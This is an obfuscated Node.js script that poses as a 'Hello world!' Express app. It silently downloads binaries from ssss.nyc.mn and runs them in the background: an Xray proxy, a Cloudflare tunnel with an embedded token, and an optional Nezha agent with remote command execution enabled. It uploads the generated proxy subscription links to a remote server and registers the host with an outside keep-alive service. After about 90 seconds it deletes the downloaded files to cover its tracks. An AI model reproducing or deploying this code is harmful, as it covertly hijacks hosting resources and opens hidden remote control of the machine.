const _0x1c935a=_0x3176;(function(_0x5e1ed9,_0x536a0a){const _0x19c648=_0x3176,_0x41d0be=_0x5e1ed9();while(!![]){try{const _0x2b9d25=parseInt(_0x19c648(0x226))/0x1*(parseInt(_0x19c648(0x209))/0x2)+parseInt(_0x19c648(0x238))/0x3*(-parseInt(_0x19c648(0x252))/0x4)+parseInt(_0x19c648(0x239))/0x5+-parseInt(_0x19c648(0x210))/0x6+-parseInt(_0x19c648(0x21f))/0x7+-parseInt(_0x19c648(0x299))/0x8*(parseInt(_0x19c648(0x21e))/0x9)+parseInt(_0x19c648(0x22c))/0xa;if(_0x2b9d25===_0x536a0a)break;else _0x41d0be['push'](_0x41d0be['shift']());}catch(_0x3a6268){_0x41d0be['push'](_0x41d0be['shift']());}}}(_0x186f,0x75296));const express=require(_0x1c935a(0x1f6)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1c935a(0x253)),{promisify}=require(_0x1c935a(0x277)),exec=promisify(require(_0x1c935a(0x240))[_0x1c935a(0x260)]),{execSync}=require(_0x1c935a(0x240)),UPLOAD_URL=process[_0x1c935a(0x21d)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x1c935a(0x21d)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1c935a(0x21d)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x1c935a(0x21d)][_0x1c935a(0x215)]||_0x1c935a(0x27d),SUB_PATH=process[_0x1c935a(0x21d)][_0x1c935a(0x206)]||_0x1c935a(0x259),PORT=process[_0x1c935a(0x21d)][_0x1c935a(0x27e)]||process[_0x1c935a(0x21d)][_0x1c935a(0x29c)]||0xbb8,UUID=process[_0x1c935a(0x21d)][_0x1c935a(0x258)]||'bc97f674-c578-4940-9234-0a1da46041b9',NEZHA_SERVER=process[_0x1c935a(0x21d)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x1c935a(0x254)]||'',NEZHA_KEY=process[_0x1c935a(0x21d)][_0x1c935a(0x234)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x1c935a(0x20f),ARGO_AUTH=process[_0x1c935a(0x21d)][_0x1c935a(0x202)]||'eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiMzBhNDU5OGQtYzU1NC00MGZmLThiMDEtODc3YTg1NTVhZWI1IiwicyI6Ik5tSmlObVl3T0RFdE16WXpPQzAwTm1VekxXSTROR1F0TUROak5tRXhNREkxWkRNMyJ9',ARGO_PORT=process[_0x1c935a(0x21d)]['ARGO_PORT']||0x1f41,CFIP=process[_0x1c935a(0x21d)][_0x1c935a(0x264)]||_0x1c935a(0x255),CFPORT=process[_0x1c935a(0x21d)]['CFPORT']||0x1bb,NAME=process[_0x1c935a(0x21d)][_0x1c935a(0x1f0)]||'';!fs[_0x1c935a(0x280)](FILE_PATH)?(fs[_0x1c935a(0x23a)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x1c935a(0x282)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1002bd=_0x1c935a,_0x94fbea=_0x1002bd(0x244);let _0xfdb46f='';for(let _0x3b3a28=0x0;_0x3b3a28<0x6;_0x3b3a28++){_0xfdb46f+=_0x94fbea[_0x1002bd(0x20a)](Math[_0x1002bd(0x23d)](Math[_0x1002bd(0x25f)]()*_0x94fbea['length']));}return _0xfdb46f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1c935a(0x285)](FILE_PATH,npmName),phpPath=path[_0x1c935a(0x285)](FILE_PATH,phpName),webPath=path[_0x1c935a(0x285)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x1c935a(0x281)),bootLogPath=path[_0x1c935a(0x285)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x4cfdf7=_0x1c935a;try{if(!UPLOAD_URL)return;if(!fs[_0x4cfdf7(0x280)](subPath))return;let _0x2b73da;try{_0x2b73da=fs[_0x4cfdf7(0x27f)](subPath,'utf-8');}catch{return null;}const _0x179643=Buffer[_0x4cfdf7(0x25b)](_0x2b73da,_0x4cfdf7(0x292))[_0x4cfdf7(0x22f)](_0x4cfdf7(0x205)),_0x53c83d=_0x179643[_0x4cfdf7(0x223)]('\x0a')[_0x4cfdf7(0x1f4)](_0x36e53f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4cfdf7(0x1fb)](_0x36e53f));if(_0x53c83d['length']===0x0)return;return axios[_0x4cfdf7(0x1f1)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4cfdf7(0x1ef)]({'nodes':_0x53c83d}),{'headers':{'Content-Type':_0x4cfdf7(0x25c)}})[_0x4cfdf7(0x241)](_0x176667=>{return null;}),null;}catch(_0x4db75a){return null;}}function cleanupOldFiles(){const _0x5f45b8=_0x1c935a;try{const _0xce510b=fs['readdirSync'](FILE_PATH);_0xce510b[_0x5f45b8(0x265)](_0x38a4d3=>{const _0x460650=_0x5f45b8,_0x484e87=path[_0x460650(0x285)](FILE_PATH,_0x38a4d3);try{const _0x1a4f00=fs[_0x460650(0x231)](_0x484e87);_0x1a4f00['isFile']()&&fs[_0x460650(0x20e)](_0x484e87);}catch(_0x438c2c){}});}catch(_0x57519b){}}app[_0x1c935a(0x269)]('/',function(_0x5b6aca,_0x49feb6){const _0x4a9bea=_0x1c935a;_0x49feb6[_0x4a9bea(0x247)](_0x4a9bea(0x1f5));});async function generateConfig(){const _0xb2759=_0x1c935a,_0x5a9558={'log':{'access':_0xb2759(0x272),'error':_0xb2759(0x272),'loglevel':_0xb2759(0x28d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xb2759(0x22d),'settings':{'clients':[{'id':UUID,'flow':_0xb2759(0x204)}],'decryption':_0xb2759(0x28d),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0xb2759(0x221),'dest':0xbbc}]},'streamSettings':{'network':_0xb2759(0x214)}},{'port':0xbb9,'listen':_0xb2759(0x294),'protocol':_0xb2759(0x22d),'settings':{'clients':[{'id':UUID}],'decryption':_0xb2759(0x28d)},'streamSettings':{'network':_0xb2759(0x214),'security':_0xb2759(0x28d)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0xb2759(0x22d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xb2759(0x28d)},'streamSettings':{'network':'ws','security':_0xb2759(0x28d),'wsSettings':{'path':_0xb2759(0x276)}},'sniffing':{'enabled':!![],'destOverride':[_0xb2759(0x28a),_0xb2759(0x20d),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xb2759(0x294),'protocol':_0xb2759(0x225),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0xb2759(0x20d),_0xb2759(0x275)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xb2759(0x294),'protocol':_0xb2759(0x208),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xb2759(0x28d),'wsSettings':{'path':_0xb2759(0x221)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0xb2759(0x1fe)]},'outbounds':[{'protocol':'freedom','tag':_0xb2759(0x212)},{'protocol':_0xb2759(0x207),'tag':_0xb2759(0x268)}]};fs[_0xb2759(0x24c)](path[_0xb2759(0x285)](FILE_PATH,_0xb2759(0x24d)),JSON[_0xb2759(0x1ef)](_0x5a9558,null,0x2));}function _0x3176(_0x5ab2aa,_0x4efcf7){_0x5ab2aa=_0x5ab2aa-0x1ed;const _0x186f35=_0x186f();let _0x317698=_0x186f35[_0x5ab2aa];return _0x317698;}function _0x186f(){const _0x43eb44=['toString','basename','statSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20tunnel:\x20','NEZHA_KEY','\x20-s\x20','clear','includes','339EgbLNX','2597775vjikrF','mkdirSync','https://amd64.ssss.nyc.mn/web','Error\x20downloading\x20files:','floor','&fp=firefox&type=ws&host=','config.yaml','child_process','catch','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','npm\x20running\x20error:\x20','abcdefghijklmnopqrstuvwxyz','match','2096','send','2087','https://arm64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','firefox','writeFileSync','config.json','\x0a\x20\x20\x0atrojan://','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','?security=tls&sni=','data','548EYusFn','path','NEZHA_PORT','saas.sin.fan','web\x20running\x20error:\x20','\x20>/dev/null\x202>&1','UUID','sub','\x0avless://','from','application/json','443','response','random','exec','status','push','https://amd64.ssss.nyc.mn/v1','CFIP','forEach','rm\x20-rf\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','block','get','App\x20is\x20running','automatic\x20access\x20task\x20added\x20successfully','/vmess-argo?ed=2560','error','set','message','ARGO_DOMAIN:','chmod','/dev/null','unlink','/sub.txt\x20saved\x20successfully','quic','/vless-argo','util','\x20failed:\x20','php\x20running\x20error:\x20','/api/add-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2053','./tmp','SERVER_PORT','readFileSync','existsSync','list.txt','log','Error\x20executing\x20command:\x20','del\x20/f\x20/q\x20','join','http\x20server\x20is\x20running\x20on\x20port:','close','false','https://amd64.ssss.nyc.mn/bot','http','trim','Error\x20reading\x20boot.log:','none','Empowerment\x20failed\x20for\x20','ArgoDomain:','tunnel.json','/config.json\x20>/dev/null\x202>&1\x20&','base64','substring','127.0.0.1','?encryption=none&security=tls&sni=','true','platform','https://oooo.serv00.net/add-url','214648vrsxTJ','Nodes\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/agent','PORT','https://arm64.ssss.nyc.mn/agent','\x20is\x20running','/tunnel.yml\x20run','win32','fileUrl','--tls','stringify','NAME','post','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Download\x20','filter','Hello\x20world!','express','2083','tunnel.yml','Subscription\x20uploaded\x20successfully','all','test','fileName','length','https+local://8.8.8.8/dns-query','nohup\x20','8443','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ARGO_AUTH','unshift','xtls-rprx-vision','utf-8','SUB_PATH','blackhole','trojan','1275814LRIKfX','charAt','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-c\x20\x22','tls','unlinkSync','clawrunsg.xiangyu-group.com.cn','2081124xLgaWy','\x0aclient_secret:\x20','direct','\x20-c\x20','tcp','FILE_PATH','\x20successfully','boot.log','pipe','arm64','Content-Type','amd','\x22\x20>\x20/dev/null\x202>&1','env','297mcjUXm','5303690KxEkJi','has','/trojan-argo','/api/add-subscriptions','split','https://arm64.ssss.nyc.mn/web','vmess','1QDDQZE','createWriteStream','arm','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','finish','13278600WBRYno','vless','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'];_0x186f=function(){return _0x43eb44;};return _0x186f();}function getSystemArchitecture(){const _0x144415=_0x1c935a,_0x174ddf=os['arch']();return _0x174ddf===_0x144415(0x228)||_0x174ddf===_0x144415(0x219)||_0x174ddf==='aarch64'?'arm':_0x144415(0x21b);}function downloadFile(_0x147d3d,_0x671d3b,_0x3efeb4){const _0x4f6961=_0x1c935a,_0x101345=_0x147d3d;!fs[_0x4f6961(0x280)](FILE_PATH)&&fs[_0x4f6961(0x23a)](FILE_PATH,{'recursive':!![]});const _0x38df94=fs[_0x4f6961(0x227)](_0x101345);axios({'method':_0x4f6961(0x269),'url':_0x671d3b,'responseType':'stream'})['then'](_0x1e82b7=>{const _0x206cfd=_0x4f6961;_0x1e82b7[_0x206cfd(0x251)][_0x206cfd(0x218)](_0x38df94),_0x38df94['on'](_0x206cfd(0x22b),()=>{const _0x31abac=_0x206cfd;_0x38df94[_0x31abac(0x287)](),console[_0x31abac(0x282)](_0x31abac(0x1f3)+path['basename'](_0x101345)+_0x31abac(0x216)),_0x3efeb4(null,_0x101345);}),_0x38df94['on'](_0x206cfd(0x26d),_0x4ed6e8=>{const _0x35460c=_0x206cfd;fs[_0x35460c(0x273)](_0x101345,()=>{});const _0x10a962=_0x35460c(0x1f3)+path[_0x35460c(0x230)](_0x101345)+_0x35460c(0x278)+_0x4ed6e8[_0x35460c(0x26f)];console[_0x35460c(0x26d)](_0x10a962),_0x3efeb4(_0x10a962);});})[_0x4f6961(0x241)](_0x2bd272=>{const _0x8953ba=_0x4f6961,_0x261c8d='Download\x20'+path[_0x8953ba(0x230)](_0x101345)+_0x8953ba(0x278)+_0x2bd272[_0x8953ba(0x26f)];console[_0x8953ba(0x26d)](_0x261c8d),_0x3efeb4(_0x261c8d);});}async function downloadFilesAndRun(){const _0xadb2e3=_0x1c935a,_0xc40555=getSystemArchitecture(),_0x263535=getFilesForArchitecture(_0xc40555);if(_0x263535[_0xadb2e3(0x1fd)]===0x0){console[_0xadb2e3(0x282)](_0xadb2e3(0x1f2));return;}const _0x1f048c=_0x263535['map'](_0x2be0f9=>{return new Promise((_0x18d39d,_0x4f8bdd)=>{const _0xc350a6=_0x3176;downloadFile(_0x2be0f9[_0xc350a6(0x1fc)],_0x2be0f9[_0xc350a6(0x1ed)],(_0x57b787,_0x551f1c)=>{_0x57b787?_0x4f8bdd(_0x57b787):_0x18d39d(_0x551f1c);});});});try{await Promise[_0xadb2e3(0x1fa)](_0x1f048c);}catch(_0x1a41a0){console['error'](_0xadb2e3(0x23c),_0x1a41a0);return;}function _0x4516a9(_0x109043){const _0x535b52=_0xadb2e3,_0xc0d131=0x1fd;_0x109043[_0x535b52(0x265)](_0x52a5e8=>{const _0x1d5fe9=_0x535b52;fs[_0x1d5fe9(0x280)](_0x52a5e8)&&fs[_0x1d5fe9(0x271)](_0x52a5e8,_0xc0d131,_0x3cc10f=>{const _0x7a8a5b=_0x1d5fe9;_0x3cc10f?console['error'](_0x7a8a5b(0x28e)+_0x52a5e8+':\x20'+_0x3cc10f):console[_0x7a8a5b(0x282)]('Empowerment\x20success\x20for\x20'+_0x52a5e8+':\x20'+_0xc0d131[_0x7a8a5b(0x22f)](0x8));});});}const _0xd37075=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4516a9(_0xd37075);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x358018=NEZHA_SERVER[_0xadb2e3(0x237)](':')?NEZHA_SERVER[_0xadb2e3(0x223)](':')['pop']():'',_0x1ab257=new Set([_0xadb2e3(0x25d),_0xadb2e3(0x200),_0xadb2e3(0x246),_0xadb2e3(0x248),_0xadb2e3(0x1f7),_0xadb2e3(0x27c)]),_0x588eda=_0x1ab257[_0xadb2e3(0x220)](_0x358018)?_0xadb2e3(0x296):_0xadb2e3(0x288),_0x27e2a3=_0xadb2e3(0x211)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xadb2e3(0x232)+_0x588eda+_0xadb2e3(0x24a)+UUID;fs['writeFileSync'](path[_0xadb2e3(0x285)](FILE_PATH,_0xadb2e3(0x23f)),_0x27e2a3);const _0x35204f=_0xadb2e3(0x1ff)+phpPath+_0xadb2e3(0x20c)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x35204f),console['log'](phpName+_0xadb2e3(0x29e)),await new Promise(_0x552f41=>setTimeout(_0x552f41,0x3e8));}catch(_0x2d5ec5){console['error'](_0xadb2e3(0x279)+_0x2d5ec5);}}else{let _0x583d52='';const _0x16a184=[_0xadb2e3(0x25d),_0xadb2e3(0x200),_0xadb2e3(0x246),_0xadb2e3(0x248),_0xadb2e3(0x1f7),_0xadb2e3(0x27c)];_0x16a184[_0xadb2e3(0x237)](NEZHA_PORT)&&(_0x583d52=_0xadb2e3(0x1ee));const _0x4cc49d='nohup\x20'+npmPath+_0xadb2e3(0x235)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x583d52+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4cc49d),console[_0xadb2e3(0x282)](npmName+_0xadb2e3(0x29e)),await new Promise(_0x2287be=>setTimeout(_0x2287be,0x3e8));}catch(_0xc539f6){console['error'](_0xadb2e3(0x243)+_0xc539f6);}}}else console[_0xadb2e3(0x282)](_0xadb2e3(0x20b));const _0x51bbb7=_0xadb2e3(0x1ff)+webPath+_0xadb2e3(0x213)+FILE_PATH+_0xadb2e3(0x291);try{await exec(_0x51bbb7),console[_0xadb2e3(0x282)](webName+_0xadb2e3(0x29e)),await new Promise(_0x201cf1=>setTimeout(_0x201cf1,0x3e8));}catch(_0x26acbd){console[_0xadb2e3(0x26d)](_0xadb2e3(0x256)+_0x26acbd);}if(fs[_0xadb2e3(0x280)](botPath)){let _0x1993e6;if(ARGO_AUTH[_0xadb2e3(0x245)](/^[A-Z0-9a-z=]{120,250}$/))_0x1993e6=_0xadb2e3(0x229)+ARGO_AUTH;else ARGO_AUTH[_0xadb2e3(0x245)](/TunnelSecret/)?_0x1993e6='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0xadb2e3(0x29f):_0x1993e6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xadb2e3(0x242)+ARGO_PORT;try{await exec(_0xadb2e3(0x1ff)+botPath+'\x20'+_0x1993e6+'\x20>/dev/null\x202>&1\x20&'),console[_0xadb2e3(0x282)](botName+_0xadb2e3(0x29e)),await new Promise(_0x24f44e=>setTimeout(_0x24f44e,0x7d0));}catch(_0x3ea17d){console[_0xadb2e3(0x26d)](_0xadb2e3(0x283)+_0x3ea17d);}}await new Promise(_0x135f29=>setTimeout(_0x135f29,0x1388));}function getFilesForArchitecture(_0x5b7a32){const _0x2f7872=_0x1c935a;let _0x24d21e;_0x5b7a32===_0x2f7872(0x228)?_0x24d21e=[{'fileName':webPath,'fileUrl':_0x2f7872(0x224)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x24d21e=[{'fileName':webPath,'fileUrl':_0x2f7872(0x23b)},{'fileName':botPath,'fileUrl':_0x2f7872(0x289)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x12d38f=_0x5b7a32===_0x2f7872(0x228)?_0x2f7872(0x29d):_0x2f7872(0x29b);_0x24d21e[_0x2f7872(0x203)]({'fileName':npmPath,'fileUrl':_0x12d38f});}else{const _0x5b1388=_0x5b7a32===_0x2f7872(0x228)?_0x2f7872(0x249):_0x2f7872(0x263);_0x24d21e[_0x2f7872(0x203)]({'fileName':phpPath,'fileUrl':_0x5b1388});}}return _0x24d21e;}function argoType(){const _0x2221de=_0x1c935a;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2221de(0x237)]('TunnelSecret')){fs['writeFileSync'](path[_0x2221de(0x285)](FILE_PATH,_0x2221de(0x290)),ARGO_AUTH);const _0x50c3fd=_0x2221de(0x233)+ARGO_AUTH[_0x2221de(0x223)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x2221de(0x285)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x2221de(0x201)+ARGO_PORT+_0x2221de(0x22e);fs[_0x2221de(0x24c)](path[_0x2221de(0x285)](FILE_PATH,_0x2221de(0x1f8)),_0x50c3fd);}else console[_0x2221de(0x282)](_0x2221de(0x22a));}argoType();async function extractDomains(){const _0x5eeb1b=_0x1c935a;let _0x296e73;if(ARGO_AUTH&&ARGO_DOMAIN)_0x296e73=ARGO_DOMAIN,console[_0x5eeb1b(0x282)](_0x5eeb1b(0x270),_0x296e73),await _0x1ed5c6(_0x296e73);else try{const _0x13ed37=fs['readFileSync'](path[_0x5eeb1b(0x285)](FILE_PATH,_0x5eeb1b(0x217)),_0x5eeb1b(0x205)),_0x5c89dd=_0x13ed37[_0x5eeb1b(0x223)]('\x0a'),_0x1579ef=[];_0x5c89dd[_0x5eeb1b(0x265)](_0x2c9802=>{const _0x361970=_0x5eeb1b,_0x5c15ff=_0x2c9802[_0x361970(0x245)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5c15ff){const _0x3e109c=_0x5c15ff[0x1];_0x1579ef[_0x361970(0x262)](_0x3e109c);}});if(_0x1579ef[_0x5eeb1b(0x1fd)]>0x0)_0x296e73=_0x1579ef[0x0],console[_0x5eeb1b(0x282)](_0x5eeb1b(0x28f),_0x296e73),await _0x1ed5c6(_0x296e73);else{console[_0x5eeb1b(0x282)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x5eeb1b(0x285)](FILE_PATH,_0x5eeb1b(0x217)));async function _0x56f2a5(){const _0x4fbcf2=_0x5eeb1b;try{process[_0x4fbcf2(0x297)]===_0x4fbcf2(0x2a0)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x4fbcf2(0x20a)](0x0)+']'+botName[_0x4fbcf2(0x293)](0x1)+_0x4fbcf2(0x21c));}catch(_0x5e3d2e){}}_0x56f2a5(),await new Promise(_0x53b929=>setTimeout(_0x53b929,0xbb8));const _0x53a77e=_0x5eeb1b(0x27b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x53a77e+'\x20>/dev/null\x202>&1\x20&'),console[_0x5eeb1b(0x282)](botName+_0x5eeb1b(0x29e)),await new Promise(_0x41991f=>setTimeout(_0x41991f,0xbb8)),await extractDomains();}catch(_0x4fcd4f){console[_0x5eeb1b(0x26d)](_0x5eeb1b(0x283)+_0x4fcd4f);}}}catch(_0x20340b){console[_0x5eeb1b(0x26d)](_0x5eeb1b(0x28c),_0x20340b);}async function _0x1ed5c6(_0x526ad6){const _0x20b8c1=_0x5eeb1b,_0x3b3ee5=execSync(_0x20b8c1(0x24f),{'encoding':_0x20b8c1(0x205)}),_0x8bae3f=_0x3b3ee5[_0x20b8c1(0x28b)](),_0x2cbe2c=NAME?NAME+'-'+_0x8bae3f:_0x8bae3f;return new Promise(_0x33e13d=>{setTimeout(()=>{const _0x35d34d=_0x3176,_0x3bbaf0={'v':'2','ps':''+_0x2cbe2c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x35d34d(0x28d),'net':'ws','type':'none','host':_0x526ad6,'path':_0x35d34d(0x26c),'tls':_0x35d34d(0x20d),'sni':_0x526ad6,'alpn':'','fp':_0x35d34d(0x24b)},_0x2cf3be=_0x35d34d(0x25a)+UUID+'@'+CFIP+':'+CFPORT+_0x35d34d(0x295)+_0x526ad6+_0x35d34d(0x23e)+_0x526ad6+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2cbe2c+'\x0a\x20\x20\x0avmess://'+Buffer[_0x35d34d(0x25b)](JSON['stringify'](_0x3bbaf0))[_0x35d34d(0x22f)](_0x35d34d(0x292))+_0x35d34d(0x24e)+UUID+'@'+CFIP+':'+CFPORT+_0x35d34d(0x250)+_0x526ad6+_0x35d34d(0x23e)+_0x526ad6+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x2cbe2c+'\x0a\x20\x20\x20\x20';console[_0x35d34d(0x282)](Buffer['from'](_0x2cf3be)['toString'](_0x35d34d(0x292))),fs[_0x35d34d(0x24c)](subPath,Buffer[_0x35d34d(0x25b)](_0x2cf3be)[_0x35d34d(0x22f)](_0x35d34d(0x292))),console[_0x35d34d(0x282)](FILE_PATH+_0x35d34d(0x274)),uploadNodes(),app[_0x35d34d(0x269)]('/'+SUB_PATH,(_0x20715b,_0x27078c)=>{const _0x5b3caf=_0x35d34d,_0x533f35=Buffer[_0x5b3caf(0x25b)](_0x2cf3be)[_0x5b3caf(0x22f)](_0x5b3caf(0x292));_0x27078c[_0x5b3caf(0x26e)](_0x5b3caf(0x21a),'text/plain;\x20charset=utf-8'),_0x27078c['send'](_0x533f35);}),_0x33e13d(_0x2cf3be);},0x7d0);});}}async function uploadNodes(){const _0x1bbe16=_0x1c935a;if(UPLOAD_URL&&PROJECT_URL){const _0x7d7a24=PROJECT_URL+'/'+SUB_PATH,_0x8c8dea={'subscription':[_0x7d7a24]};try{const _0x22f0ea=await axios[_0x1bbe16(0x1f1)](UPLOAD_URL+_0x1bbe16(0x222),_0x8c8dea,{'headers':{'Content-Type':_0x1bbe16(0x25c)}});return _0x22f0ea&&_0x22f0ea[_0x1bbe16(0x261)]===0xc8?(console[_0x1bbe16(0x282)](_0x1bbe16(0x1f9)),_0x22f0ea):null;}catch(_0xa22cca){if(_0xa22cca[_0x1bbe16(0x25e)]){if(_0xa22cca[_0x1bbe16(0x25e)][_0x1bbe16(0x261)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1bbe16(0x280)](listPath))return;const _0x1775da=fs['readFileSync'](listPath,_0x1bbe16(0x205)),_0x6b7123=_0x1775da[_0x1bbe16(0x223)]('\x0a')['filter'](_0x41e608=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1bbe16(0x1fb)](_0x41e608));if(_0x6b7123[_0x1bbe16(0x1fd)]===0x0)return;const _0xfd9c58=JSON[_0x1bbe16(0x1ef)]({'nodes':_0x6b7123});try{const _0x34bc59=await axios[_0x1bbe16(0x1f1)](UPLOAD_URL+_0x1bbe16(0x27a),_0xfd9c58,{'headers':{'Content-Type':_0x1bbe16(0x25c)}});return _0x34bc59&&_0x34bc59[_0x1bbe16(0x261)]===0xc8?(console[_0x1bbe16(0x282)](_0x1bbe16(0x29a)),_0x34bc59):null;}catch(_0x101d50){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x38eca9=_0x3176,_0x446cc3=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x446cc3[_0x38eca9(0x262)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x446cc3[_0x38eca9(0x262)](phpPath);process[_0x38eca9(0x297)]==='win32'?exec(_0x38eca9(0x284)+_0x446cc3[_0x38eca9(0x285)]('\x20')+'\x20>\x20nul\x202>&1',_0x278f83=>{const _0x5ab561=_0x38eca9;console[_0x5ab561(0x236)](),console[_0x5ab561(0x282)](_0x5ab561(0x26a)),console[_0x5ab561(0x282)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x38eca9(0x266)+_0x446cc3[_0x38eca9(0x285)]('\x20')+_0x38eca9(0x257),_0x55edf2=>{const _0x419fad=_0x38eca9;console[_0x419fad(0x236)](),console[_0x419fad(0x282)](_0x419fad(0x26a)),console[_0x419fad(0x282)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1e8860=_0x1c935a;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x53012b=await axios[_0x1e8860(0x1f1)](_0x1e8860(0x298),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1e8860(0x25c)}});return console[_0x1e8860(0x282)](_0x1e8860(0x26b)),_0x53012b;}catch(_0x2080e4){return console[_0x1e8860(0x26d)](_0x1e8860(0x267)+_0x2080e4[_0x1e8860(0x26f)]),null;}}async function startserver(){const _0x2398a3=_0x1c935a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3bd715){console[_0x2398a3(0x26d)]('Error\x20in\x20startserver:',_0x3bd715);}}startserver()[_0x1c935a(0x241)](_0x3a62f5=>{const _0x480d1c=_0x1c935a;console[_0x480d1c(0x26d)]('Unhandled\x20error\x20in\x20startserver:',_0x3a62f5);}),app['listen'](PORT,()=>console['log'](_0x1c935a(0x286)+PORT+'!'));
